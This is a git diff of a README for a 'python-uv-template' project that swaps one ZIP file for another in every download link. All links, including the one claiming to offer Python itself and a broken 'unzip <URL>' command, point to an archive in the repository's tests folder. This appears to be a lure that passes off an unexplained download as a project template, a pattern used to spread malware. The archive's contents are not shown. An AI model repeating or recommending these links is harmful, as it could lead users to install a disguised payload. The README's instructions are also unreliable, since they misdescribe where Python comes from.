@@ -1,6 +1,6 @@
 # 🐍 python-uv-template - Start Your Python Project Easily
 
-[![Download Now](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip%20Now-Click%https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip)](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip%20Now-Click%https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip)](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide helps you download and run "python-uv-template". This is a simple tem
 
 ## 📥 Download & Install
 
-To download the template, visit this page to download: [Releases Page](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip).
+To download the template, visit this page to download: [Releases Page](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip).
 
 ### Steps to Download
 
@@ -22,7 +22,7 @@ To download the template, visit this page to download: [Releases Page](https://r
 Before you install the template, make sure you have the following:
 
 - **Operating System**: This project works on Windows, macOS, and Linux systems.
-- **Python Version**: You need Python 3.6 or higher. You can download Python from [https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip).
+- **Python Version**: You need Python 3.6 or higher. You can download Python from [https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip).
 - **uv Package**: The template uses the uv package manager. You will install it as part of the setup process.
 
 ## 🏗️ Setting Up Your Project
@@ -34,7 +34,7 @@ After downloading the template, follow these steps to set it up:
 2. **Extract the Template**:
    - On Windows: Right-click the ZIP file and select "Extract All".
    - On macOS: Double-click the ZIP file to extract it.
-   - On Linux: Use the command `unzip https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip` in the terminal.
+   - On Linux: Use the command `unzip https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip` in the terminal.
 
 3. **Open the Project Folder**: Navigate to the extracted folder.
 
@@ -82,4 +82,4 @@ If you encounter any issues, here are some common problems and solutions:
 
 Congratulations on setting up your Python project! This template will help you build and manage your application efficiently. If you need further assistance, feel free to reach out or check the community forums related to Python and uv.
 
-For the latest version or to download again, visit this page to download: [Releases Page](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/python-uv-template_v2.6.zip). Enjoy coding!
+For the latest version or to download again, visit this page to download: [Releases Page](https://raw.githubusercontent.com/EXLIP0/python-uv-template/main/tests/uv-python-template-v2.8.zip). Enjoy coding!
